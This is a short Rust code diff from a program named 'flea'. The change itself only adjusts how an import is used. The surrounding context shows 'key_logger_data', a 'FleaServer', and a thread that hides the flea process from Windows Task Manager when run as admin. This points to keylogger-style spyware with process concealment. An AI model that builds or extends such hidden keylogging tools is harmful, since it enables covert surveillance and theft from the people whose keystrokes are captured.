@@ -8,6 +8,7 @@ extern crate getopts;
 use std::{thread, env};
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicBool, Ordering};
+use flealib::hideflea::hide_flea_process;
 use getopts::Options;
 use local_ip_address::local_ip;
 
@@ -127,7 +128,7 @@ fn main()
     //Hide flea process in Task Manager (only on Windows. Must be ran as admin)
     let kl2 = Arc::clone(&key_logger_data);
     let handle2 = thread::spawn(move|| {
-        flealib::hideflea::hide_flea_process(kl2);
+        hide_flea_process(kl2);
     });
 
     let flea_server = FleaServer{};
